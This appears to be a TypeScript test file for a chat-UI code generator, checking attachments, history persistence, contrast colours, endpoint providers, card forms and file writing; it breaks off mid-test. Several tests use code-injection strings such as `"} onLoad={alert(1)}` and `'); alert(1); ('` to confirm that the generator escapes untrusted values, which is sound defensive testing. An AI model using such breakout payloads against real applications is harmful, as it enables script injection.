// CU-1: pin the emitted exclusion-disclosure comment itself, so a refactor of
// emitCustomApp can't silently drop the loud-declaration this format commits
// to for `custom` layout. The list below is a literal restatement of the
// capabilities emitCustomApp deliberately leaves unwired (starters,
// attachments, reasoning display-mode, reasoningOpen, header.title, empty) —
// it must be kept in sync BY HAND with that function's own comment (and with
// the "not wired" tests above/below that each capability carries) whenever
// the custom-layout exclusion list changes.
describe('CU-1: custom layout exclusion disclosure', () => {
  it('the emitted comment names every capability NOT wired on custom, so a silent drop cannot ship unnoticed', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'] })),
      'src/App.tsx',
    );
    const excludedCapabilities = [
      'starters',
      'attachments',
      'reasoning display-mode',
      'reasoningOpen',
      'header.title',
      'empty',
    ];
    for (const capability of excludedCapabilities) {
      expect(app).toContain(capability);
    }
  });
});

describe('capabilities.attachments', () => {
  it('threads accept into ChatThread\'s own attach/accept props — the paperclip, staging, and FileReader.readAsDataURL round-trip already live in ChatThread/DefaultPromptInput; nothing to hand-compose', () => {
    // Branch reality (post kit-fix 93af0f62 + Task 3 gating): ChatThread
    // already owns the whole attach affordance end to end — the button, the
    // hidden file input, staging previews, reading each file with
    // FileReader.readAsDataURL (never URL.createObjectURL), and handing the
    // staged list back via onSubmit's `attachments`. Its Message component
    // already groups consecutive file parts into one <Attachments> row. So
    // codegen's only job is threading the construct's accept list into the
    // existing attach/accept props — hand-rolling a second picker or a
    // second file-part renderer here would restate what the kit already
    // owns, exactly the lesson `capabilities.starters` pinned above.
    const app = file(
      generateProject(construct({ capabilities: { attachments: { accept: ['image/*', 'application/pdf'] } } })),
      'src/App.tsx',
    );
    expect(app).toContain('attach={true}');
    expect(app).toContain('accept={"image/*,application/pdf"}');
    // The construct's own submit() folds the picked attachments into the
    // outgoing user message's parts — the one piece createKaiChat's
    // append/streamAssistant ops don't do on their own.
    expect(app).toContain("type: 'file' as const, attachment");
    expect(app).toContain('detail.attachments.map');
    // No hand-rolled file input/FileReader/Attachments import: that would be
    // restating ChatThread + Message's own implementation.
    expect(app).not.toContain('readAsDataURL');
    expect(app).not.toContain('createObjectURL');
    expect(app).not.toContain('<Attachments');
    expect(app).not.toContain('<Attachment ');
  });

  it('no attachments capability, attach stays explicitly off and no accept prop at all', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('attach={false}');
    expect(app).not.toMatch(/\baccept=\{/);
  });

  it('a hostile accept entry cannot break out of the emitted string literal (JSON.stringify, not a raw JSX attribute string)', () => {
    const hostile = '"} onLoad={alert(1)} x={"';
    const app = file(
      generateProject(construct({ capabilities: { attachments: { accept: [hostile] } } })),
      'src/App.tsx',
    );
    expect(app).toContain(`accept={${JSON.stringify(hostile)}}`);
    expect(app).not.toContain(`accept="${hostile}"`);
  });
});

describe('capabilities.history', () => {
  it('history local: load-on-mount + persist-on-change via localStorage, keyed by tag', () => {
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('localStorage');
    // JSON.stringify'd (double-quoted), same convention as the endpoint url
    // below and provider.url — not the brief's hand-typed single-quote form.
    expect(app).toContain(JSON.stringify('kai:acme-support:thread'));
    expect(app).toContain('createEffect');
  });

  it('history endpoint: GET on mount, PUT on change — consumer owns the server', () => {
    // url is JSON.stringify'd at the interpolation site, same convention as
    // provider.url (see "endpoint provider" below) — double-quoted, not the
    // brief's hand-typed single-quote form.
    const app = file(
      generateProject(
        construct({ capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } } }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain(`fetch(${JSON.stringify('/api/thread')})`);
    expect(app).toContain("method: 'PUT'");
  });

  it('history none / absent: no persistence code at all', () => {
    expect(file(generateProject(construct()), 'src/App.tsx')).not.toContain('localStorage');
  });

  it('history local: a stored value that parses but is not an array is ignored, not handed to setMessages', () => {
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('Array.isArray(parsed)');
    // The isArray gate must sit BETWEEN the parse and setMessages, not after.
    const parseIdx = app.indexOf('JSON.parse(saved)');
    const isArrayIdx = app.indexOf('Array.isArray(parsed)');
    const setMessagesIdx = app.indexOf('chat.setMessages(() => parsed');
    expect(parseIdx).toBeGreaterThan(-1);
    expect(isArrayIdx).toBeGreaterThan(parseIdx);
    expect(setMessagesIdx).toBeGreaterThan(isArrayIdx);
  });

  it('history endpoint: the GET hydrate is try/catch\'d, decides loudly, and flips hydrated on BOTH success and failure (a failed load must not permanently disable future PUTs)', () => {
    const app = file(
      generateProject(
        construct({ capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } } }),
      ),
      'src/App.tsx',
    );
    // The GET chain is wrapped, not fire-and-forget like the old version.
    expect(app).toMatch(/try\s*{[^}]*fetch\(/s);
    expect(app).toContain('console.error');
    // hydrated is set in a `finally` (or equivalent unconditional path) so a
    // rejected fetch / non-OK response still unblocks the write-back effect —
    // "start fresh, keep saving", not "never save again".
    expect(app).toContain('finally');
    expect(app).toContain('hydrated = true;');
    // Only ONE `hydrated = true` assignment inside the async load IIFE would
    // leave the failure path unhandled if it lived only in the try branch —
    // pin that the assignment is inside `finally`, not `try`.
    const finallyIdx = app.indexOf('finally');
    const hydratedTrueAfterFinally = app.indexOf('hydrated = true;', finallyIdx);
    expect(hydratedTrueAfterFinally).toBeGreaterThan(finallyIdx);
  });

  it('history endpoint: a well-formed non-array GET body is rejected before reaching setMessages', () => {
    const app = file(
      generateProject(
        construct({ capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } } }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('Array.isArray(saved)');
    expect(app).toContain('console.warn');
  });

  it('history endpoint: the PUT write-back is guarded with .catch and decides loudly on failure (fire-and-forget is not silent)', () => {
    const app = file(
      generateProject(
        construct({ capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } } }),
      ),
      'src/App.tsx',
    );
    expect(app).toMatch(/method: 'PUT'[\s\S]*\.catch\(/);
    expect(app).toMatch(/\.catch\([\s\S]*console\.error/);
  });

  it('a hostile endpoint url cannot break out of the emitted string literal (JSON.stringify, not string concatenation)', () => {
    const hostile = "'); alert(1); ('";
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'endpoint', url: hostile } } })),
      'src/App.tsx',
    );
    expect(app).toContain(`fetch(${JSON.stringify(hostile)})`);
    expect(app).not.toContain(`fetch('${hostile}')`);
  });
});

describe('accent contrast (paired --kai-color-primary-foreground)', () => {
  it('resolveContrastForeground: a light accent (yellow) picks black; #e91e63 picks white', () => {
    // Worked numbers (see the doc comment on resolveContrastForeground for
    // why this is a luminance-distance comparison, not the WCAG contrast-
    // RATIO formula): yellow #ffff00 has relative luminance ≈0.928 (>0.5 —
    // closer to white, so black text sits on it); #e91e63 has relative
    // luminance ≈0.192 (<=0.5 — closer to black, so white text sits on it).
    expect(resolveContrastForeground('#ffff00')).toBe('#000000');
    expect(resolveContrastForeground('#e91e63')).toBe('#ffffff');
  });

  it('resolveContrastForeground: parses rgb()/hsl() numeric forms the same way as hex', () => {
    expect(resolveContrastForeground('rgb(255, 255, 0)')).toBe('#000000');
    expect(resolveContrastForeground('hsl(0, 76%, 52%)')).toEqual(expect.stringMatching(/^#(000000|ffffff)$/));
  });

  it('resolveContrastForeground: does not guess at named colors, var(), or other exotic syntax', () => {
    expect(resolveContrastForeground('var(--brand)')).toBeNull();
    expect(resolveContrastForeground('yellow')).toBeNull();
    expect(resolveContrastForeground('color-mix(in oklab, red, blue)')).toBeNull();
  });

  it('a parseable accent emits the base --kai-color-primary-foreground declaration before the @supports override, both at :host', () => {
    const element = file(generateProject(construct({ theme: { accent: '#e91e63', mode: 'system' } })), 'src/element.tsx');
    expect(element).toContain(':host { --kai-color-primary-foreground: #ffffff; }');
    expect(element).toContain('@supports (color: contrast-color(red))');
    expect(element).toContain('contrast-color(var(--kai-color-primary))');
    // Ordering: the base declaration comes BEFORE (outside) the @supports
    // block, so ordinary cascade order lets the native answer win where the
    // browser supports it, and lets the codegen-computed floor stand where it
    // doesn't — no !important needed either way.
    const baseIdx = element.indexOf('--kai-color-primary-foreground: #ffffff');
    const supportsIdx = element.indexOf('@supports');
    expect(baseIdx).toBeGreaterThan(-1);
    expect(supportsIdx).toBeGreaterThan(baseIdx);
  });

  it('an unparseable accent skips the base foreground declaration, still emits @supports, and leaves a softened NOTICE', () => {
    const files = generateProject(construct({ theme: { accent: 'var(--brand)', mode: 'system' } }));
    const element = file(files, 'src/element.tsx');
    expect(element).not.toContain('--kai-color-primary-foreground: #ffffff');
    expect(element).not.toContain('--kai-color-primary-foreground: #000000');
    // @supports still covers it natively where the browser can resolve
    // contrast-color() itself, accent included.
    expect(element).toContain('@supports (color: contrast-color(red))');
    expect(element).toContain('contrast-color(var(--kai-color-primary))');
    // NOTICE, softened: the theme default stands only in browsers that can't
    // do contrast-color() — not an unconditional claim.
    expect(element).toMatch(/NOTICE:.*not parseable for contrast/);
    expect(element).toMatch(/without CSS contrast-color\(\) support/);
  });

  it('accentContrastNotice: null when there is no accent or the accent parses; one line when it does not', () => {
    expect(accentContrastNotice(construct())).toBeNull();
    expect(accentContrastNotice(construct({ theme: { accent: '#e91e63', mode: 'system' } }))).toBeNull();
    const notice = accentContrastNotice(construct({ theme: { accent: 'var(--brand)', mode: 'system' } }));
    expect(notice).toMatch(/^accent 'var\(--brand\)' not parseable for contrast/);
    expect(notice).toMatch(/without CSS contrast-color\(\) support/);
  });
});

describe('endpoint provider', () => {
  const endpoint = (wire: 'openai' | 'anthropic', url = '/api/chat') =>
    construct({ provider: { mode: 'endpoint', url, wire } });

  it('openai wire: fetch to the declared URL, readOpenAIStream + toOpenAIMessages', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    // JSON.stringify(url) at the interpolation site (see the security test
    // below) — double-quoted, not the brief's hand-typed single-quote form.
    expect(app).toContain(`fetch(${JSON.stringify('/api/chat')}`);
    expect(app).toContain('readOpenAIStream(');
    expect(app).toContain('toOpenAIMessages(');
    expect(app).not.toContain('createMockResponder');
  });

  it('anthropic wire: the anthropic reader/encoder pair', () => {
    const app = file(generateProject(endpoint('anthropic')), 'src/App.tsx');
    expect(app).toContain('readAnthropicStream(');
    expect(app).toContain('toAnthropicMessages(');
  });

  it('no hand-rolled SSE and no key material, ever', () => {
    for (const wire of ['openai', 'anthropic'] as const) {
      const app = file(generateProject(endpoint(wire)), 'src/App.tsx');
      expect(app).not.toMatch(/text\/event-stream|EventSource|api[_-]?key|Authorization/i);
    }
  });

  it('mock stays mock: no fetch, no readOpenAIStream reader import name collision with the wire encoders', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('createMockResponder');
    expect(app).not.toContain('toOpenAIMessages(');
    expect(app).not.toContain('toAnthropicMessages(');
  });

  it('url is JSON-stringified at the fetch call site — a quote/backtick/script payload cannot break out into new JS', () => {
    // Mirrors the accent-escaping precedent in emitElement: provider.url is an
    // UNCONSTRAINED z.string(), so it must be embedded the same safe way.
    const hostile = `'; alert(1); const x='`;
    const app = file(generateProject(endpoint('openai', hostile)), 'src/App.tsx');
    expect(app).toContain(`fetch(${JSON.stringify(hostile)}`);
    // The raw payload must never appear un-escaped as its own token boundary.
    expect(app).not.toContain(`fetch('${hostile}'`);
  });

  it('url is never embedded in a // comment — a U+2028/U+2029 line-separator payload cannot end the comment and expose executable text', () => {
    // U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR) are valid JS
    // line terminators that end a `//` comment, but are NOT touched by
    // commentSafe's \r\n strip — so hand-rolling comment-escaping for
    // untrusted text is a trap. The real fix is structural: the url is never
    // interpolated into a comment at all, only into the fetch() call via
    // JSON.stringify (a real string literal, immune to this class of bug).
    const hostile = `http://x console.log("INJECTED");//`;
    const app = file(generateProject(endpoint('openai', hostile)), 'src/App.tsx');
    const jsonLiteral = JSON.stringify(hostile);
    expect(app).toContain(`fetch(${jsonLiteral}`);
    // Strip the one legitimate occurrence (the JSON string literal on the
    // fetch() line) and confirm the payload appears nowhere else — in
    // particular not bare in a `//` comment where it could break out.
    const withoutTheOneLiteral = app.split(jsonLiteral).join('');
    expect(withoutTheOneLiteral).not.toContain('INJECTED');
    expect(withoutTheOneLiteral).not.toContain(' ');
  });

  it('endpoint branch: a throwing fetch/reader surfaces via stream.abort — no unhandled rejection, no stuck loading', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    expect(app).toMatch(/try\s*\{[\s\S]*fetch\(/);
    expect(app).toMatch(/catch \(err\) \{\s*stream\.abort\(/);
  });

  it('endpoint branch: a non-2xx response is thrown before parsing, not silently rendered as an empty reply', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    expect(app).toMatch(/if \(!response\.ok\) throw new Error/);
  });

  it('mock branch: the same throw -> stream.abort discipline applies (a malformed scripted turn must not hang loading forever either)', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toMatch(/try\s*\{[\s\S]*readOpenAIStream\(/);
    expect(app).toMatch(/catch \(err\) \{\s*stream\.abort\(/);
  });
});

describe('cards', () => {
  it('renders card parts via CardRenderer and projects tools via @kitn.ai/ui/schemas', () => {
    const files = generateProject(
      construct({
        cards: [{ name: 'refund_approval', schema: { type: 'object', properties: { amount: { type: 'number' } } } }],
      }),
    );
    const app = file(files, 'src/App.tsx');
    expect(app).toContain('CardRenderer');
    expect(app).toContain("part.type === 'card'");
    expect(app).toContain("from '@kitn.ai/ui/schemas'");
    expect(file(files, 'src/cards.ts')).toContain('refund_approval');
  });

  it('no cards, no card code and no src/cards.ts', () => {
    const files = generateProject(construct());
    expect(files.some((f) => f.path === 'src/cards.ts')).toBe(false);
    expect(file(files, 'src/App.tsx')).not.toContain('CardRenderer');
  });

  it('src/cards.ts emits the registry verbatim, keyed by card name, deterministic', () => {
    const files = generateProject(
      construct({
        cards: [{ name: 'refund_approval', schema: { type: 'object', properties: { amount: { type: 'number' } } } }],
      }),
    );
    const cardsFile = file(files, 'src/cards.ts');
    expect(cardsFile).toContain('export const cards = {');
    expect(cardsFile).toContain('refund_approval:');
    expect(cardsFile).toContain('"amount"');
    expect(cardsFile).toMatch(/}\s*as const;/);
  });

  it('App.tsx imports the registry and cardFromToolCall', () => {
    const app = file(
      generateProject(construct({ cards: [{ name: 'refund_approval', schema: { type: 'object' } }] })),
      'src/App.tsx',
    );
    expect(app).toContain("import { cards } from './cards';");
    expect(app).toContain('cardFromToolCall');
  });

  it('does NOT register cardSchemas on ChatThread — a card\'s data is its own declared schema, not values shaped like it, so validating it against itself would always fail hard', () => {
    // Live-caught regression: registering `cardSchemas={cards}` here made
    // CardRenderer validate `cards[name]` (a JSON Schema / FormDefinition) AGAINST
    // `cards[name]` as if it were VALUES — e.g. "(root).amount: required" on a
    // FormDefinition that has no top-level `amount` key at all — which is a HARD
    // failure in card-renderer.tsx and renders CardFallback instead of the form
    // every single time. cardTypes (the renderer map) is unaffected and stays.
    const app = file(
      generateProject(construct({ cards: [{ name: 'refund_approval', schema: { type: 'object' } }] })),
      'src/App.tsx',
    );
    expect(app).not.toContain('cardSchemas={cards}');
    expect(app).not.toMatch(/\bcardSchemas=\{/);
  });

  it('every declared card name routes to the kit\'s own form renderer, not the fallback — cardTypes registered on ChatThread', () => {
    // SUPERVISOR RULING: a construct card must render as a real schema-driven
    // form (BUILTIN_CARD_COMPONENTS.form), never as CardFallback. cardSchemas
    // alone is validation-only and does not select a renderer — CardRenderer
    // picks the component from `types` (ChatThread's `cardTypes` prop), so
    // that map has to be registered too, keyed by the same card names.
    const app = file(
      generateProject(
        construct({
          cards: [
            { name: 'refund_approval', schema: { type: 'object', properties: { amount: { type: 'number' } } } },
          ],
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain("BUILTIN_CARD_COMPONENTS");
    expect(app).toMatch(/from '@kitn\.ai\/ui\/solid';[\s\S]*BUILTIN_CARD_COMPONENTS/);
    expect(app).toContain('BUILTIN_CARD_COMPONENTS.form');
    expect(app).toContain('cardTypes={cardTypes}');
    // The map is DERIVED from the registry's own keys, not hand-listed, so a
    // second card in the construct is covered without a codegen change.
    expect(app).toMatch(/Object\.keys\(cards\)\.map\(\s*\(name\)\s*=>\s*\[name,\s*BUILTIN_CARD_COMPONENTS\.form\]/);
  });

  it('a card tool call renders with the DECLARED schema (with the model\'s args merged onto field defaults, CD-1/Task 19g) as its data, never the raw call arguments verbatim', () => {
    // The construct author's fields are still the vocabulary the form draws —
    // the model's tool-call args only ever seed FormField.default, never
    // replace the schema itself.
    const app = file(
      generateProject(construct({ cards: [{ name: 'refund_approval', schema: { type: 'object' } }] })),
      'src/App.tsx',
    );
    expect(app).toContain('cards[card.type as keyof typeof cards]');
    expect(app).not.toContain('stream.addCard(card)');
  });

  it('endpoint + openai wire: the fetch body carries tools: toOpenAITools(cards)', () => {
    const app = file(
      generateProject(
        construct({
          provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' },
          cards: [{ name: 'refund_approval', schema: { type: 'object' } }],
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('toOpenAITools(cards)');
    expect(app).toMatch(/tools:\s*toOpenAITools\(cards\)/);
  });

  it('endpoint + anthropic wire: the fetch body carries tools: toAnthropicTools(cards)', () => {
    const app = file(
      generateProject(
        construct({
          provider: { mode: 'endpoint', url: '/api/chat', wire: 'anthropic' },
          cards: [{ name: 'refund_approval', schema: { type: 'object' } }],
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('toAnthropicTools(cards)');
    expect(app).not.toContain('toOpenAITools');
  });

  it('no cards: no tools field on the endpoint fetch body, no schemas import', () => {
    const app = file(
      generateProject(construct({ provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('tools:');
    expect(app).not.toContain("from '@kitn.ai/ui/schemas'");
  });

  it('mock provider + cards: a settled tool call is converted to a card via cardFromToolCall/addCard', () => {
    const app = file(
      generateProject(construct({ cards: [{ name: 'refund_approval', schema: { type: 'object' } }] })),
      'src/App.tsx',
    );
    expect(app).toContain('cardFromToolCall(');
    expect(app).toContain('stream.addCard(');
    // Settled before stream.done(), reading the just-written tool part back off
    // chat.messages() (the mutator API has no getter of its own).
    const cardIdx = app.indexOf('stream.addCard(');
    const doneIdx = app.indexOf('stream.done();');
    expect(cardIdx).toBeGreaterThan(-1);
    expect(doneIdx).toBeGreaterThan(cardIdx);
  });
});

describe('CD-1: model tool-call args merge into FormField defaults (Task 19g)', () => {
  const cardConstruct = () =>
    construct({
      cards: [
        {
          name: 'refund_approval',
          schema: {
            type: 'object',
            properties: {
              amount: { type: 'number', title: 'Amount' },
              reason: { type: 'string', title: 'Reason' },
            },
          },
        },
      ],
    });

  it('emits a shallow-merge helper and applies it before addCard', () => {
    const app = file(generateProject(cardConstruct()), 'src/App.tsx');
    expect(app).toContain('function mergeToolArgsIntoFormDefaults');
    expect(app).toMatch(/stream\.addCard\(\{ \.\.\.card, data: merge/);
    // The wholesale replacement this task removes must be GONE, not just
    // supplemented — leaving both would silently re-introduce the drop.
    expect(app).not.toContain('data: cards[card.type as keyof typeof cards] }');
  });

  it('only top-level keys present in the model args get a default; declared field shape (title/type) is untouched', () => {
    const app = file(generateProject(cardConstruct()), 'src/App.tsx');
    expect(app).toContain('properties: { ...schema.properties');
  });
});

/**
 * `mergeToolArgsIntoFormDefaults` exists TWICE (review round 1, Task 19g fix):
 * a real, exported TS function in this module (used directly by tests, e.g.
 * codegen-cards.render.test.tsx) and an EMITTED-STRING twin inside
 * `emitCardsImport`'s return value that App.tsx gets verbatim — kept in sync
 * by hand, not by import, same as every other piece of construct-glue logic
 * this file emits. `verify:construct` proves the twin COMPILES under a
 * real cell's strict tsconfig, but nothing proved it BEHAVES the same as the
 * real function — a future edit to one (adding recursion, changing
 * precedence) could drift silently.
 *
 * This describe block extracts the twin's actual source out of a generated
 * App.tsx, strips its TS type annotations with the real TypeScript compiler
 * (not hand-written string surgery, and NOT `.toString()` on the real
 * function — that would lose the emitted copy's own annotations, which is
 * exactly what the strict per-cell tsc pass needs and what this guard must
 * exercise), and runs it through `new Function` so it is executed, not just
 * pattern-matched. The same case table then runs against both the real
 * function and the extracted twin and asserts identical outputs — so any
 * behavioral drift between the two turns this test red.
 */
describe('CD-1 drift guard: the real mergeToolArgsIntoFormDefaults and its emitted twin behave identically', () => {
  type MergeFn = (
    schema: Record<string, unknown>,
    args: Record<string, unknown>,
  ) => Record<string, unknown>;

  /** Pull the emitted twin's source out of a generated App.tsx, strip its TS
   *  annotations via the real TypeScript compiler, and return it as a
   *  callable function — the twin, actually running, not just grepped. */
  function extractEmittedTwin(appSource: string): MergeFn {
    // Non-greedy up to the function's own closing brace on its own line at
    // column 0 — every brace INSIDE the function body is indented, so this
    // uniquely bounds the declaration regardless of what code follows it in
    // the concatenated App.tsx (this function is not always the last thing
    // emitCardsImport's own template contributes once other emit* functions'
    // output is appended after it).
    const match = appSource.match(/function mergeToolArgsIntoFormDefaults\([\s\S]*?\n\}\n/);
    if (!match) {
      throw new Error('mergeToolArgsIntoFormDefaults not found in the emitted App.tsx — extraction regex is stale.');
    }
    const { outputText } = ts.transpileModule(match[0], {
      compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2020 },
    });
    // eslint-disable-next-line @typescript-eslint/no-implied-eval -- deliberate: executing the EMITTED twin's own stripped source is the point of this guard.
    const factory = new Function(`${outputText}\nreturn mergeToolArgsIntoFormDefaults;`);
    return factory() as MergeFn;
  }

  const cardConstruct = () =>
    construct({
      cards: [
        {
          name: 'refund_approval',
          schema: {
            type: 'object',
            properties: {
              amount: { type: 'number', title: 'Amount' },
              reason: { type: 'string', title: 'Reason' },
            },
          },
        },
      ],
    });

  const app = () => file(generateProject(cardConstruct()), 'src/App.tsx');

  const CASES: Array<{ name: string; schema: Record<string, unknown>; args: Record<string, unknown> }> = [
    {
      name: 'merges a known top-level key onto default',
      schema: { type: 'object', properties: { amount: { type: 'number', title: 'Amount' } } },
      args: { amount: 50 },
    },
    {
      name: 'ignores a key the schema does not declare',
      schema: { type: 'object', properties: { amount: { type: 'number', title: 'Amount' } } },
      args: { amount: 50, bogus_field: 'nope' },
    },
    {
      name: 'a model arg overrides an explicit static default (precedence)',
      schema: { type: 'object', properties: { amount: { type: 'number', title: 'Amount', default: 10 } } },
      args: { amount: 75 },
    },
    {
      name: 'x-kai-mask/x-kai-format hints on the field survive the merge untouched',
      schema: {
        type: 'object',
        properties: {
          ticket: {
            type: 'string',
            title: 'Change ticket',
            pattern: '^CHG-[0-9]{4}$',
            'x-kai-format': 'custom',
            'x-kai-mask': 'CHG-####',
            'x-kai-mask-guide': 'CHG-####',
          },
        },
      },
      args: { ticket: 'CHG-4821' },
    },
    {
      name: 'no properties on the schema at all — returned unchanged',
      schema: { type: 'object' },
      args: { amount: 1 },
    },
    {
      name: 'empty args — no field gets a new default',
      schema: { type: 'object', properties: { amount: { type: 'number', title: 'Amount' } } },
      args: {},
    },
  ];

  it('the extraction regex actually finds the twin (sanity — fails loudly if codegen.ts moves it)', () => {
    expect(() => extractEmittedTwin(app())).not.toThrow();
  });

  for (const { name, schema, args } of CASES) {
    it(`identical output: ${name}`, () => {
      const twin = extractEmittedTwin(app());
      const fromReal = mergeToolArgsIntoFormDefaults(schema, args);
      const fromTwin = twin(schema, args);
      expect(fromTwin).toEqual(fromReal);
    });
  }
});

describe('writeProject', () => {
  it('writes files and prunes stale ones tracked via .kai-manifest.json', () => {
    const dir = mkdtempSync(join(tmpdir(), 'kai-construct-'));
    const projectA = generateProject(construct());
    writeProject(projectA, dir);
    for (const f of projectA) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const projectB = projectA.filter((f) => f.path !== 'index.html');
    writeProject(projectB, dir);

    expect(existsSync(join(dir, 'index.html'))).toBe(false);
    for (const f of projectB) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const manifest = JSON.parse(readFileSync(join(dir, '.kai-manifest.json'), 'utf8')) as string[];
    expect(manifest).toEqual(projectB.map((f) => f.path).sort());
  });

  it('a byte-identical regen touches ZERO files (no mtime bump — a rewritten vite.config.ts restarts the preview Vite server)', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'kai-construct-'));
    const project = generateProject(construct());
    writeProject(project, dir);
    const paths = [...project.map((f) => f.path), '.kai-manifest.json'];
    const before = new Map(paths.map((p) => [p, statSync(join(dir, p)).mtimeMs]));

    // Filesystem mtime resolution can swallow a rewrite that lands in the
    // same tick; the gap makes "unchanged mtime" mean "no write happened".
    await new Promise((r) => setTimeout(r, 20));
    const overwritten = writeProject(generateProject(construct()), dir);

    expect(overwritten).toEqual([]);
    for (const p of paths) {
      expect(statSync(join(dir, p)).mtimeMs, `${p} was rewritten`).toBe(before.get(p));
    }
  });

  it('a regen with ONE changed file writes only that file — and the prune manifest still covers the FULL emitted list', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'kai-construct-'));
    writeProject(generateProject(construct()), dir);
    // A hand-edit to one file (the case eject warns about) — regen must put
    // the generated content back, and touch nothing else.
    writeFileSync(join(dir, 'src/App.tsx'), '// hand-edited\n');
    const project = generateProject(construct());
    const before = new Map(project.map((f) => [f.path, statSync(join(dir, f.path)).mtimeMs]));
    await new Promise((r) => setTimeout(r, 20));

    const overwritten = writeProject(project, dir);

    expect(overwritten).toEqual(['src/App.tsx']);
    expect(readFileSync(join(dir, 'src/App.tsx'), 'utf8')).not.toContain('hand-edited');
    for (const f of project) {
      if (f.path === 'src/App.tsx') continue;
      expect(statSync(join(dir, f.path)).mtimeMs, `${f.path} was rewritten`).toBe(before.get(f.path));
    }
    // The CRITICAL constraint (a changed-only sink upstream got this wrong and
    // pruned the project): the manifest is built from the FULL emitted list,
    // never the changed subset, so nothing unchanged is pruned on the NEXT run.
    const manifest = JSON.parse(readFileSync(join(dir, '.kai-manifest.json'), 'utf8')) as string[];
    expect(manifest).toEqual(project.map((f) => f.path).sort());
    // And the next full regen prunes nothing: every file still stands.
    writeProject(generateProject(construct()), dir);
    for (const f of project) expect(existsSync(join(dir, f.path))).toBe(true);
  });
});

describe('capabilities.conversations', () => {
  it('threads conversations={true} and a wired localStorageStore onto ChatThread for local persistence', () => {
    const app = file(
      generateProject(construct({ capabilities: { conversations: true, history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('conversations={true}');
    expect(app).toContain("import { localStorageStore } from '@kitn.ai/ui/solid'");
    expect(app).toContain("localStorageStore('acme-support')");
    expect(app).toContain('store={');
  });

  // Task 6 live-browser regression: ChatThread never mutates `messages`
  // itself (chat-thread.tsx's own doc on `onConversationLoad`) — select/new/
  // mount-restore all resolve through ChatThread's internal state (activeId,
  // view, the list) but the actually-RENDERED thread only changes if the
  // host wires `onConversationLoad` back to its own message store. Every
  // jsdom test above this one passed `messages`/`store` explicitly and so
  // could never catch the callback's absence — this asserts the emitted
  // wire directly, at the layer that would have caught it (the previous
  // version of this file emitted `conversations={true} store={...}` with NO
  // `onConversationLoad` at all, and every other assertion in this describe
  // block still passed).
  it('wires onConversationLoad back to the chat store — without it, select/new/restore never change the rendered thread (Task 6 regression)', () => {
    const app = file(
      generateProject(construct({ capabilities: { conversations: true, history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('onConversationLoad={(messages) => chat.setMessages(() => messages)}');
  });

  it('wires a fetchStore for endpoint persistence, url JSON.stringify\'d', () => {
    const app = file(
      generateProject(
        construct({ capabilities: { conversations: true, history: { persistence: 'endpoint', url: '/api/threads' } } }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain("import { fetchStore } from '@kitn.ai/ui/solid'");
    expect(app).toContain(`fetchStore(${JSON.stringify('/api/threads')})`);
  });

  it('no conversations capability: neither prop is emitted', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain('conversations={true}');
    expect(app).not.toContain('ConversationStore');
  });

  it('custom layout: conversations is NOT wired — declared loudly, matching CU-1\'s precedent', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], capabilities: { conversations: true, history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('conversations={true}');
  });
});

// Owner follow-up, 2026-08-26: closing the widget while its conversations
// list was open left ChatThread's internal view state at 'list', so the NEXT
// open landed back on the list instead of the default chat screen. Every
// jsdom-level ChatThread test for this covers the component itself
// (chat-thread.test.tsx's own describe block); these assert the EMITTED wire
// directly, at the layer that actually connects Dock's close notification to
// ChatThread's reset — the same "layer that would have caught it" reasoning
// as the onConversationLoad regression test above (a construct with no
// wiring here would still pass every ChatThread-level test, since those
// drive ChatThread's own controllerRef directly).
describe('conversations + widget: reset the list view to chat on Dock close (owner follow-up)', () => {
  it('declares chatController, wires it onto ChatThread, and wires Dock onOpenChange to reset it on close', () => {
    const app = file(
      generateProject(construct({ layout: 'widget', capabilities: { conversations: true, history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('let chatController: ChatThreadController | undefined;');
    expect(app).toContain('controllerRef={(api) => (chatController = api)}');
    expect(app).toContain('onOpenChange={(open) => { setDockOpen(open); if (!open) chatController?.closeConversationsList(); }}');
    expect(app).toContain("import type { AttachmentData, ChatThreadController } from '@kitn.ai/ui/solid'");
  });

  it('no conversations capability on a widget: none of the reset wiring is emitted', () => {
    const app = file(generateProject(construct({ layout: 'widget' })), 'src/App.tsx');
    expect(app).not.toContain('chatController');
    expect(app).not.toContain('ChatThreadController');
  });

  it('custom layout with conversations on: no reset wiring — there is no Dock to close/reopen', () => {
